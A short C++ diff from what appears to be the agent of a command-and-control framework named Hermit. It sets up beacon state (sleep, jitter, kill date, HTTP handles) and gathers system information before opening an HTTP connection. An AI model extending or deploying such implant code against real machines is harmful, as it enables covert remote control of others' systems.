@@ -57,15 +57,13 @@ namespace Hermit
 		pState->nSleep 				= nSleep;
 		pState->nJitter 			= nJitter;
 		pState->nKillDate 			= nKillDate;
-		pState->wUUID 				= L"";
-		pState->wTask 				= L"";
-		pState->wTaskResult 		= L"";
 		pState->hSession 			= NULL;
 		pState->hConnect 			= NULL;
 		pState->hRequest 			= NULL;
 		pState->pSocket 			= NULL;
 		pState->bQuit 				= FALSE;
 
+		// Get system information
 		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);
 
 		Handler::HTTPInit(pState);
